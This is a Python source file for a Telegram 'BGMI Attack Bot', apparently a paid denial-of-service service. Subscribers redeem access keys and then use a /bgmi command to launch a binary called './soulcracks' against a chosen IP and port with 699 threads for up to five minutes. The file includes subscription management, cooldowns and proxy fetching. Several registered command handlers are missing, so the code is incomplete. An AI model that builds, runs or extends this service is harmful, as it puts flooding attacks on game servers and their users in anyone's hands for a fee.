import asyncio
import datetime
import itertools
import json
import logging
import os
import random
import string
import time
import sys
from ipaddress import ip_address
from typing import Dict, Optional, List
import pytz

import aiohttp
from telegram import Update
from telegram.ext import (ApplicationBuilder, CommandHandler, ContextTypes)

from config import ADMIN_IDS, BOT_TOKEN, OWNER_USERNAME

# Configure logging with both file and console handlers
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Constants
USER_FILE = "users.json"
KEY_FILE = "keys.json"
DEFAULT_THREADS = 699
MAX_DURATION = 300  # Maximum attack duration in seconds
COOLDOWN_TIME = 240  # Cooldown between attacks for non-admin users
REQUEST_TIMEOUT = 10  # Timeout for HTTP requests
MAX_CONCURRENT_ATTACKS = 3  # Maximum concurrent attacks per user
RATE_LIMIT_WINDOW = 60  # Rate limit window in seconds
MAX_REQUESTS = 10  # Maximum requests per window
IST_TZ = pytz.timezone('Asia/Kolkata')

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, List[float]] = {}
    
    def can_execute(self, user_id: str) -> bool:
        """Check if user can execute command within rate limits."""
        current_time = time.time()
        if user_id not in self.requests:
            self.requests[user_id] = []
        
        # Clean old requests
        self.requests[user_id] = [
            req_time for req_time in self.requests[user_id]
            if current_time - req_time < RATE_LIMIT_WINDOW
        ]
        
        if len(self.requests[user_id]) >= MAX_REQUESTS:
            return False
        
        self.requests[user_id].append(current_time)
        return True

class UserManager:
    def __init__(self):
        self.users: Dict[str, dict] = {}
        self.keys: Dict[str, str] = {}
        self.user_processes: Dict[str, dict] = {}
        self.last_attack_time: Dict[str, float] = {}
        self.attack_history: Dict[str, List[dict]] = {}
        self.load_data()

    def load_data(self) -> None:
        """Load user and key data from files with backup."""
        try:
            for filename in [USER_FILE, KEY_FILE]:
                if os.path.exists(filename):
                    with open(filename, "r") as file:
                        data = json.load(file)
                        if filename == USER_FILE:
                            self.users = data
                        else:
                            self.keys = data
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            # Create backup and start fresh
            for filename in [USER_FILE, KEY_FILE]:
                if os.path.exists(filename):
                    backup_name = f"{filename}.bak.{int(time.time())}"
                    os.rename(filename, backup_name)
            self.users = {}
            self.keys = {}

    def save_data(self) -> None:
        """Save user and key data atomically."""
        try:
            for data, filename in [(self.users, USER_FILE), (self.keys, KEY_FILE)]:
                # Write to temporary file first
                temp_file = f"{filename}.tmp"
                with open(temp_file, "w") as file:
                    json.dump(data, file, indent=2)
                # Atomic replace
                os.replace(temp_file, filename)
        except Exception as e:
            logger.error(f"Error saving data: {e}")
            raise

    def generate_key(self, length: int = 16) -> str:
        """Generate a cryptographically secure random key."""
        try:
            return ''.join(random.SystemRandom().choice(
                string.ascii_letters + string.digits) for _ in range(length))
        except Exception:
            logger.warning("Falling back to less secure random generation")
            return ''.join(random.choice(
                string.ascii_letters + string.digits) for _ in range(length))

    def add_time_to_current_date(self, hours: int = 0, days: int = 0) -> str:
        """Add time to current date in IST timezone."""
        try:
            current_time = datetime.datetime.now(IST_TZ)
            new_time = current_time + datetime.timedelta(hours=hours, days=days)
            return new_time.strftime('%Y-%m-%d %H:%M:%S')
        except Exception as e:
            logger.error(f"Error in time calculation: {e}")
            raise

    def is_user_authorized(self, user_id: str) -> bool:
        """Check if user is authorized with proper timezone handling."""
        try:
            if user_id not in self.users:
                return False
            current_time = datetime.datetime.now(IST_TZ)
            expiration = datetime.datetime.strptime(
                self.users[user_id]['expiration'], 
                '%Y-%m-%d %H:%M:%S'
            ).replace(tzinfo=IST_TZ)
            return current_time <= expiration
        except Exception as e:
            logger.error(f"Error checking user authorization: {e}")
            return False

    def can_user_attack(self, user_id: str) -> tuple[bool, Optional[str]]:
        """Check if user can perform an attack with concurrent limit."""
        if user_id in ADMIN_IDS:
            return True, None
        
        active_attacks = sum(1 for process in self.user_processes.values() 
                           if process["user_id"] == user_id)
        if active_attacks >= MAX_CONCURRENT_ATTACKS:
            return False, f"Maximum concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached"

        current_time = time.time()
        if user_id in self.last_attack_time:
            time_passed = current_time - self.last_attack_time[user_id]
            if time_passed < COOLDOWN_TIME:
                return False, f"Please wait {int(COOLDOWN_TIME - time_passed)} seconds"
        
        return True, None

    def log_attack(self, user_id: str, target_ip: str, port: str, duration: str) -> None:
        """Log attack details for history."""
        if user_id not in self.attack_history:
            self.attack_history[user_id] = []
        
        self.attack_history[user_id].append({
            "timestamp": datetime.datetime.now(IST_TZ).isoformat(),
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        })

        # Keep only last 10 attacks
        self.attack_history[user_id] = self.attack_history[user_id][-10:]

class AttackManager:
    def __init__(self, user_manager: UserManager):
        self.user_manager = user_manager
        self.proxy_manager = ProxyManager()

    def validate_attack_params(self, target_ip: str, port: str, duration: str) -> tuple[bool, str]:
        """Validate attack parameters with improved checks."""
        try:
            # Validate IP address format
            ip = ip_address(target_ip)
            
            port_num = int(port)
            duration_num = int(duration)

            if not (1 <= port_num <= 65535):
                return False, "Invalid port number (1-65535)"
            if not (1 <= duration_num <= MAX_DURATION):
                return False, f"Duration must be between 1 and {MAX_DURATION} seconds"
            
            return True, ""
        except ValueError:
            return False, "Invalid IP address or numeric parameters"

    def validate_executable(self) -> tuple[bool, str]:
        """Validate attack executable with proper permissions check."""
        executable_path = './soulcracks'
        if not os.path.exists(executable_path):
            return False, "Attack executable not found"
        if not os.access(executable_path, os.X_OK):
            return False, "Attack executable not executable"
        return True, ""

    async def cleanup_old_processes(self):
        """Clean up completed processes and update attack counts."""
        current_time = time.time()
        for attack_id in list(self.user_manager.user_processes.keys()):
            process_info = self.user_manager.user_processes[attack_id]
            if process_info["process"].returncode is not None:
                duration = current_time - process_info["start_time"]
                logger.info(f"Attack completed for user {process_info['user_id']}, "
                          f"duration: {duration:.2f}s")
                del self.user_manager.user_processes[attack_id]

    async def start_attack(self, target_ip: str, port: str, duration: str, user_id: str) -> tuple[bool, str]:
        """Start an attack with improved process management."""
        valid, error_msg = self.validate_executable()
        if not valid:
            return False, error_msg

        valid, error_msg = self.validate_attack_params(target_ip, port, duration)
        if not valid:
            return False, error_msg

        can_attack, error_msg = self.user_manager.can_user_attack(user_id)
        if not can_attack:
            return False, error_msg

        try:
            command = ['./soulcracks', target_ip, port, duration, str(DEFAULT_THREADS)]
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            attack_id = f"{user_id}_{int(time.time())}"

            self.user_manager.user_processes[attack_id] = {
                "process": process,
                "command": command,
                "target_ip": target_ip,
                "port": port,
                "start_time": time.time(),
                "user_id": user_id
            }

            self.user_manager.log_attack(user_id, target_ip, port, duration)

            if user_id not in ADMIN_IDS:
                self.user_manager.last_attack_time[user_id] = time.time()

            return True, f"Attack started on {target_ip}:{port} for {duration} seconds"
        except Exception as e:
            logger.error(f"Error starting attack: {e}")
            return False, "Error starting attack process"

    async def stop_attack(self, user_id: str) -> tuple[bool, str]:
        """Stop all active attacks for a user."""
        if not any(info["user_id"] == user_id for info in self.user_manager.user_processes.values()):
            return False, "No active attacks found"

        try:
            stopped_count = 0
            for attack_id, process_info in list(self.user_manager.user_processes.items()):
                if process_info["user_id"] == user_id:
                    process = process_info["process"]
                    if process.returncode is None:
                        process.terminate()
                        await process.wait()
                        stopped_count += 1
                        del self.user_manager.user_processes[attack_id]
            
            return True, f"Stopped {stopped_count} attack(s) successfully"
        except Exception as e:
            logger.error(f"Error stopping attacks: {e}")
            return False, "Error stopping attack process"

class ProxyManager:
    def __init__(self):
        self.proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all'
        self.proxies = []
        self.last_fetch_time = 0
        self.fetch_interval = 300  # 5 minutes

    async def fetch_proxies(self) -> bool:
        """Fetch fresh proxies from API."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.proxy_api_url, timeout=REQUEST_TIMEOUT) as response:
                    if response.status == 200:
                        text = await response.text()
                        self.proxies = [p for p in text.split('\n') if p.strip()]
                        self.last_fetch_time = time.time()
                        return bool(self.proxies)
        except Exception as e:
            logger.error(f"Error fetching proxies: {e}")
            return False

    async def get_proxy(self) -> Optional[dict]:
        """Get a random proxy with automatic refresh."""
        current_time = time.time()
        if not self.proxies or current_time - self.last_fetch_time > self.fetch_interval:
            if not await self.fetch_proxies():
                return None
        
        if self.proxies:
            proxy = random.choice(self.proxies)
            return {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
        return None

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command."""
    welcome_text = (
        f"👋 Welcome to BGMI Attack Bot!\n\n"
        f"To get started:\n"
        f"1. Get an access key from an admin\n"
        f"2. Use /redeem <key> to activate your subscription\n"
        f"3. Use /help to see available commands\n\n"
        f"For support, contact {OWNER_USERNAME}"
    )
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE, user_manager: UserManager) -> None:
    """Show user's subscription status."""
    user_id = str(update.message.from_user.id)
    is_active, status_text, remaining_time = user_manager.get_subscription_status(user_id)
    
    if not is_active:
        await update.message.reply_text(
            "❌ No active subscription found\n"
            "Use /redeem <key> to activate your subscription"
        )
        return
    
    active_attacks = sum(1 for process in user_manager.user_processes.values() 
                        if process["user_id"] == user_id)
    
    status_text = (
        f"📊 *Subscription Status*\n"
        f"Status: {status_text}\n"
        f"Time Remaining: {remaining_time}\n"
        f"Active Attacks: {active_attacks}/{MAX_CONCURRENT_ATTACKS}\n"
    )
    
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show help message."""
    help_text = (
        "🔥 *Available Commands*\n\n"
        "👤 *User Commands:*\n"
        "/start - Start the bot\n"
        "/status - Check subscription status\n"
        "/redeem <key> - Redeem an access key\n"
        "/bgmi <ip> <port> <duration> - Start attack\n"
        "/stop - Stop current attack\n"
        "/help - Show this message\n\n"
        "👑 *Admin Commands:*\n"
        "/genkey <amount> <hours/days> [custom_key] - Generate key\n"
        "/broadcast <message> - Send message to all users\n\n"
        f"💬 Contact {OWNER_USERNAME} for support"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors."""
    logger.error(f"Update {update} caused error {context.error}")

def register_handlers(app: ApplicationBuilder, user_manager: UserManager, 
                     rate_limiter: RateLimiter, attack_manager: AttackManager) -> None:
    """Register all command handlers."""
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", 
        lambda u, c: status(u, c, user_manager)))
    app.add_handler(CommandHandler("redeem", 
        lambda u, c: redeem(u, c, user_manager, rate_limiter)))
    app.add_handler(CommandHandler("bgmi", 
        lambda u, c: bgmi(u, c, user_manager, rate_limiter, attack_manager)))
    app.add_handler(CommandHandler("stop", 
        lambda u, c: stop(u, c, user_manager, rate_limiter, attack_manager)))
    app.add_handler(CommandHandler("genkey", 
        lambda u, c: genkey(u, c, user_manager, rate_limiter)))
    app.add_handler(CommandHandler("broadcast", 
        lambda u, c: broadcast(u, c, rate_limiter)))
    app.add_error_handler(error_handler)

async def periodic_cleanup(attack_manager: AttackManager):
    """Run periodic cleanup tasks."""
    while True:
        try:
            await attack_manager.cleanup_old_processes()
            await asyncio.sleep(60)  # Run cleanup every minute
        except asyncio.CancelledError:
            logger.info("Cleanup task cancelled")
            break
        except Exception as e:
            logger.error(f"Error in periodic cleanup: {e}", exc_info=True)
            await asyncio.sleep(60)  # Continue cleanup even after errors

async def initialize_bot():
    """Initialize bot components and start the application."""
    try:
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        user_manager = UserManager()
        rate_limiter = RateLimiter()
        attack_manager = AttackManager(user_manager)
        return app, user_manager, rate_limiter, attack_manager
    except Exception as e:
        logger.critical(f"Failed to initialize bot components: {e}", exc_info=True)
        raise

async def shutdown_bot(cleanup_task):
    """Gracefully shutdown the bot and cleanup resources."""
    try:
        cleanup_task.cancel()
        await cleanup_task
        logger.info("Bot shutdown completed successfully")
    except Exception as e:
        logger.error(f"Error during bot shutdown: {e}", exc_info=True)

def main() -> None:
    """Main entry point for the bot application."""
    try:
        # Initialize asyncio event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Initialize bot components
        app, user_manager, rate_limiter, attack_manager = loop.run_until_complete(initialize_bot())
        
        # Register command handlers
        register_handlers(app, user_manager, rate_limiter, attack_manager)
        
        # Start periodic cleanup task
        cleanup_task = asyncio.create_task(periodic_cleanup(attack_manager))
        
        # Log successful startup
        logger.info("Bot initialized successfully - Starting polling...")
        
        # Start the bot
        app.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
            close_loop=False
        )
        
        # Graceful shutdown
        loop.run_until_complete(shutdown_bot(cleanup_task))
        
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.critical(f"Fatal error in main: {e}", exc_info=True)
        sys.exit(1)
    finally:
        # Ensure proper cleanup
        try:
            tasks = asyncio.all_tasks(loop)
            for task in tasks:
                task.cancel()
            loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
            loop.close()
        except Exception as e:
            logger.error(f"Error during final cleanup: {e}", exc_info=True)
        sys.exit(0)

if __name__ == '__main__':
    main()